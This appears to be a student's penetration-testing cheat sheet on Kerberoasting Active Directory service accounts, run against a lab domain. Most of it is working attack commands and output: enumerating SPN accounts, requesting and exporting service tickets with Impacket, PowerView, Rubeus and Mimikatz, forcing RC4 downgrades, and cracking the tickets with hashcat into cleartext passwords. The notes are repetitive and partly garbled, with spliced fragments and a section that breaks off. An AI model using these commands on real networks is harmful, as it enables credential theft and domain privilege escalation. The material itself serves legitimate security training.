## Cheatsheet

### roasting from linux

`LIST KERBERAOSTABNLE ACCOUNTS`

```
$ GetUserSPNs.py -dc-ip 172.16.5.5 blackwood.local/forend
```

`kerberoast all accounts`

```
$ GetUserSPNs.py -dc-ip 172.16.5.5 blackwood.local/forend -request
```

`### Requesting single TGS`

```
GetUserSPNs.py -dc-ip 172.16.5.5 blackwood.local/forend -request-user  SAPService -outputfile SAPSERVICE_TGS
```

`specify the domain for cross domain/forest kerberoasting`

```shell-session
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL blackwood.local/wley
```

`KERBEROAST DIFFERENT DOMAIN`

```
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL  blackwood.local/forend -request-user  sapsso -request  -outputfile sspoTGS

```

`Cracking rc4 TGSs with Hashcat`

```
hashcat -m 13100 <tgs_file> <dictionary_path>
```

Example:

```hashcat

hashcat -m 13100 tgs.ticket /usr/share/wordlists/rockyou.txt

<SNIP>
$krb5tgs$23$*SAPService$blackwood.local$blackwood.local/SAPService*$607cd881e31ff8651ff745f972c7af9c$70912a62c75e456e5065e72c9b5029442078aa1cc:!SapperFi2
```

## Roasting from windows

`Enumerate SPN Accounts`

```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
```

From here, we could target a specific user and retrieve the TGS ticket in Hashcat format.

```powershell-session
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

we can export all tickets to a CSV file for offline processing.

```powershell-session
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

find roastable

```
rubeas /stats
```

roast all admins

```powershell
 .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

#### METHOD 2; MANUAL TICKET EXTRACTION

import module

```powershell-session
Add-Type -AssemblyName System.IdentityModel
```

gather spns:

```
setspn -Q */*
```

`Authenticate to kerberos to request tickets granting services`

```
PS C:\Tools> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "vmware/blackwood.local"

```

`Kerberoasting (Retrieving All TGs with setspn.exe`

```powershell-session
PS C:\htb> setspn.exe -T blackwood.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

`Extracting the Retrieved TGS ticket from memory mimikatz`

```
.\mimikatz.exe
MMK# base64 /out:true
kerberos::list /export

```

Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.

#### Preparing the Base64 Blob for Cracking

```shell-session
$ echo "<base64 blob>" |  tr -d \\n

doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFORUZSRwEA<snip>
```

We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.

#### Placing the Output into a File as .kirbi

```shell-session
$ cat encoded_file | base64 -d > sqldev.kirbi
```

Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.

```shell-session
$ python2.7 kirbi2john.py sqldev.kirbi
```

This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat agNote on Encryption typesainst the hash.

#### Modifiying crack_file for Hashcat

```shell-session
$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Now we can check and confirm that we have a hash that can be fed to Hashcat.

```shell-session
$ cat sqldev_tgs_hashcat

$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20
```

We can then run the ticket through Hashcat again and get the cleartext password `database!`.

```shell-session
$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

## END OF CHEATSHEET

---

# Some tool guides/details

#### rubeas settings

![[Pasted image 20250724115415.png]]

#### Using the /stats Flag

```powershell-sessionNote on Encryption types
.\Rubeus.exe kerberoast /stats
```

![[Pasted image 20250724115500.png]]

```powershell-session
 .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap


[*] Total kerberoastable users : 3


[*] SamAccountName         : backupagent
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*backupagent$blackwood.local$backupjob/veam001.blackwood.local@IN
```

---

## RC4 AND AES ENCRYPTED TICKETS

When performing Kerberoasting in most environments, we will retrieve hashes that begin with `$krb5tgs$23$*`, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with `$krb5tgs$18$*`. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using [Hashcat](https://github.com/hashcat/hashcat/pull/1955), it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen. Let's walk through an example.

### Example

we have this user, we retrieve the tgs and see that its using `$23$`, why? cause tool requests rc4

```powershell-session
.\Rubeus.exe kerberoast /user:testspn /nowrap
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*te<snip>
```

Checking with PowerView, we can see that the `msDS-SupportedEncryptionTypes` attribute is set to `0`. The chart [here](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) tells us that a decimal value of `0` means that a specific encryption type is not defined and set to the default of `RC4_HMAC_MD5`.

```powershell-session
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.blackwood.local                            0 testspn
```

### cracking RC4 encrypted TGS tickets

```shell-session
$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```

## account with AES encryption:

```powershell-session
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

Requesting a new ticket with Rubeus will show us that the account name is using AES-256 (type 18) encryption.

```powershell-session
 .\Rubeus.exe kerberoast /user:testspn /nowrap
[*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
[*] Hash                   : $krb5tgs$18$testspn$blackwood.local$*
```

To run this through Hashcat, we need to use hash mode `19700`, which is `Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)`

```shell-session
$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

## tgtdeleg

**Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account.**

We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket.

```powershell-session
  .\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
```

![[kerb_tgs_18.webp]]
we can see that when supplying the `/tgtdeleg` flag, the tool requested an RC4 ticket even though the supported encryption types are listed as AES 128/256.

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running.

Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as `NT AUTHORITY\LOCAL SERVICE`. Any domain user can request a Kerberos ticket for any service account in the same domain.

This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

# Kerberos Primer

![](Screenshots/Pasted%20image%2020241126132122.png)

![](Screenshots/Pasted%20image%2020241126132059.png)

## Kerberoasting - Performing the Attack

Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)>) /netonly.

Several tools can be utilized to perform the attack:

- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.

We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a `cleartext password`, `NT password hash`, or even a` Kerberos ticket`.

#### Listing kerberoastable Accounts with GetUserSPNs.py

```
$ GetUserSPNs.py -dc-ip 172.16.5.5 blackwood.local/forend


ServicePrincipalName                               Name               MemberOf                                                                                  PasswordLastSet             LastLogon                   Delegation
-------------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  --------------------------  ----------
MSSQLSvc/DB01.blackwood.local:1433  damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=BLACKWOOD,DC=LOCAL                         2022-03-24 12:20:34.127432  2022-04-10 18:50:58.924378
MSSQL/FILE                              damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=BLACKWOOD,DC=LOCAL                         2022-03-24 12:20:34.127432  2022-04-10 18:50:58.924378
backupjob/veam001.blackwood.local              backupagent        CN=Domain Admins,CN=Users,DC=BLACKWOOD,DC=LOCAL                                       2022-02-15 17:15:40.842452  2022-04-18 21:20:32.090310
```

We can now pull all TGS tickets for offline processing using the `-request` flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.

### Requesting single TGS

```
GetUserSPNs.py -dc-ip 172.16.5.5 blackwood.local/forend -request-user  SAPService -outputfile SAPSERVICE_TGS
```

IN DIFFRENT DOMAIN

```shell-session
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL blackwood.local/wley
```

#### Requesting all TGS Tickets

```shell-session
$ GetUserSPNs.py -dc-ip 172.16.5.5 blackwood.local/forend -request

ServicePrincipalName                               Name               MemberOf                                                                                  PasswordLastSet             LastLogon                   Delegation
-------------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  --------------------------  ----------
MSSQLSvc/DB01.blackwood.local:1433  damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=BLACKWOOD,DC=LOCAL                         2022-03-24 12:20:34.127432  2022-04-10 18:50:58.924378
MSSQL/FILE                              damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=BLACKWOOD,DC=LOCAL                         2022-03-24 12:20:34.127432  2022-04-10 18:50:58.924378
backupjob/veam001.blackwood.local              backupagent        CN=Domain Admins,CN=Users,DC=BLACKWOOD,DC=LOCAL                                       2022-02-15 17:15:40.842452  2022-04-18 21:20:32.090310
sts/blackwood.local                            solarwindsmonitor  CN=Domain
```

KERBEROAST DIFFERENT DOMAIN

```
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL  blackwood.local/forend -request-user  sapsso -request  -outputfile sspoTGS

```

## Cracking TGSs with Hashcat

```
hashcat -m 13100 <tgs_file> <dictionary_path>
```

Example:

```hashcat

hashcat -m 13100 SAPService-tgs /usr/share/wordlists/rockyou.txt

<SNIP>
$krb5tgs$23$*SAPService$blackwood.local$blackwood.local/SAPService*$607cd881e31ff8651ff745f972c7af9c$70912a62c75e456e5065e72c9b5029442078aa1cc:!SapperFi2
```

# Kerberoasting - from Windows

import module

```powershell-session
Add-Type -AssemblyName System.IdentityModel
```

gather spns:

```
setspn -Q */*
```

get SPN Details for for a specific user: `<acc-name>/<domain>"`

```

PS C:\Tools> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "vmware/blackwood.local"


Id                   : uuid-d9e5ffc2-2b2f-4c20-8442-b5a61beecf9a-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 11/29/2024 12:56:28 PM
ValidTo              : 11/29/2024 10:55:06 PM
ServicePrincipalName : vmware/blackwood.local
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey



```

# output

You get awrapper with these details:

```
Id                   : uuid-d9e5ffc2-2b2f-4c20-8442-b5a61beecf9a-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 11/29/2024 12:56:28 PM
ValidTo              : 11/29/2024 10:55:06 PM
ServicePrincipalName : vmware/blackwood.local
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

and your TGS ticket, stored in memory.

#### Retrieving All Tickets Using setspn.exe

```powershell-session
PS C:\htb> setspn.exe -T blackwood.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-3
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:56:18 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : exchangeAB/DC01
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-4
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:56:18 PM
ValidTo              : 2/24/2022 11:58:18 PM
ServicePrincipalName : kadmin/changepw
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

<SNIP>
```

The above command combines the previous command with `setspn.exe` to request tickets for all accounts with SPNs set.

## Extracting the TGS ticket from memory

Now that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.

```
.\mimikatz.exe
MMK# base64 /out:true
kerberos::list /export

```

```powershell

PS C:\Tools\mimikatz\x64> .\mimikatz.exe




mimikatz # kerberos::list /export  <------ INPUT THIS [+]

   * Saved to file     : 0-40e10000-vipa0z@krbtgt~blackwood.local-blackwood.local.kirbi
```

optional: `mimikatz# base64 /out:true       <------ INPUT THIS [+]`
If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. Let's take the base64 blob retrieved above and prepare it for cracking.

Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.

#### Preparing the Base64 Blob for Cracking

```shell-session
$ echo "<base64 blob>" |  tr -d \\n

doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFORUZSRwEA<snip>
```

We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.

#### Placing the Output into a File as .kirbi

```shell-session
$ cat encoded_file | base64 -d > sqldev.kirbi
```

Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.

```shell-session
$ python2.7 kirbi2john.py sqldev.kirbi
```

This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

#### Modifiying crack_file for Hashcat

```shell-session
$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Now we can check and confirm that we have a hash that can be fed to Hashcat.

```shell-session
$ cat sqldev_tgs_hashcat

$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20
```

We can then run the ticket through Hashcat again and get the cleartext password `database!`.

```shell-session
$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

---

## tools

### powerview

Enumerate SPN Accounts

```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
```

From here, we could target a specific user and retrieve the TGS ticket in Hashcat format.

```powershell-session
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

we can export all tickets to a CSV file for offline processing.

```powershell-session
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

---

## Rubeas

#### running `./rubeas.exe`:

![[Pasted image 20250724115415.png]]
As we can see from scrolling the Rubeus help menu, the tool has a vast number of options for interacting with Kerberos, most of which are out of the scope of this module and will be covered in-depth in later modules on advanced Kerberos attacks. It is worth scrolling through the menu, familiarizing yourself with the options, and reading up on the various other possible tasks.

#### Using the /stats Flag

```powershell-session
.\Rubeus.exe kerberoast /stats
```

![[Pasted image 20250724115500.png]]

We can first use Rubeus to gather some stats. From the output below, we can see that there are nine Kerberoastable users, seven of which support `RC4` encryption for ticket requests and two of which support `AES 128/256.`
We also see that all nine accounts had their password set this year (2022 at the time of writing). If we saw any SPN accounts with their passwords**set 5 or more years ago**, they could be promising targets as they could have a weak password that was set and never changed when the organization was less mature.

request tickets for accounts with the `admincount` attribute set to `1`. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the `/nowrap` flag so that the hash can be more easily copied down for offline cracking using Hashcat.

```powershell-session
 .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

```powershell-session
[*] Total kerberoastable users : 3


[*] SamAccountName         : backupagent
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*backupagent$blackwood.local$backupjob/veam001.blackwood.local@IN
```

---

## Note on Encryption types

When performing Kerberoasting in most environments, we will retrieve hashes that begin with `$krb5tgs$23$*`, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with `$krb5tgs$18$*`. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using [Hashcat](https://github.com/hashcat/hashcat/pull/1955), it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen. Let's walk through an example.

### Example

we have this user, we retrieve the tgs and see that its using `$23$`, why? cause tool requests rc4

```powershell-session
.\Rubeus.exe kerberoast /user:testspn /nowrap
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*te<snip>
```

Checking with PowerView, we can see that the `msDS-SupportedEncryptionTypes` attribute is set to `0`. The chart [here](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) tells us that a decimal value of `0` means that a specific encryption type is not defined and set to the default of `RC4_HMAC_MD5`.

```powershell-session
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.blackwood.local                            0 testspn
```

cracking

```shell-session
$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```

## account with AES encryption:

![[Pasted image 20250724120533.png]]
If we check this with PowerView, we'll see that the `msDS-SupportedEncryptionTypes attribute` is set to `24`, meaning that AES 128/256 encryption types are the only ones supported.

```powershell-session
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.blackwood.local                            24 testspn
```

Requesting a new ticket with Rubeus will show us that the account name is using AES-256 (type 18) encryption.

```powershell-session
 .\Rubeus.exe kerberoast /user:testspn /nowrap
[*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
[*] Hash                   : $krb5tgs$18$testspn$blackwood.local$*
```

To run this through Hashcat, we need to use hash mode `19700`, which is `Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)`

```shell-session
$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

We run the AES hash as follows and check the status, which shows it should take over 23 minutes to run through the entire rockyou.txt wordlist by typing `s` to see the status of the cracking job.

When the hash finally cracks, we see that it took 4 minutes 36 seconds for a relatively simple password on a CPU. This would be greatly magnified with a stronger/longer password.

```shell-session
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 18, TGS-REP
Hash.Target......: $krb5tgs$18$testspn$blackwood.local$8939f8c5b97...413d53
Time.Started.....: Sun Feb 27 16:07:50 2022 (4 mins, 36 secs)
Time.Estimated...: Sun Feb 27 16:12:26 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    10114 H/s (9.25ms) @ Accel:1024 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2789376/14344385 (19.45%)
Rejected.........: 0/2789376 (0.00%)
Restore.Point....: 2783232/14344385 (19.40%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4032-4095
Candidates.#1....: wenses28 -> wejustare
```

## tgtdeleg

**Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account.**

We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.

```powershell-session
  .\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
```

![[kerb_tgs_18.webp]]
we can see that when supplying the `/tgtdeleg` flag, the tool requested an RC4 ticket even though the supported encryption types are listed as AES 128/256.

## A Note on E

# Extra attacks to learn

- Kerberos Delegations
- Unconstrained Delegation - Computers
- Unconstrained Delegation - Users
- Constrained Delegation Overview & Attacking from Windows
- Constrained Delegation from Linux
- RBCD Overview & Attacking from Windows
- RBCD from Linux
- Golden Ticket
- Golden Ticket from Linux
- Silver Ticket
- Silver Ticket from Linux
- Hardening/Mitigations
- Detection
- Skills Assessment

## Powerview
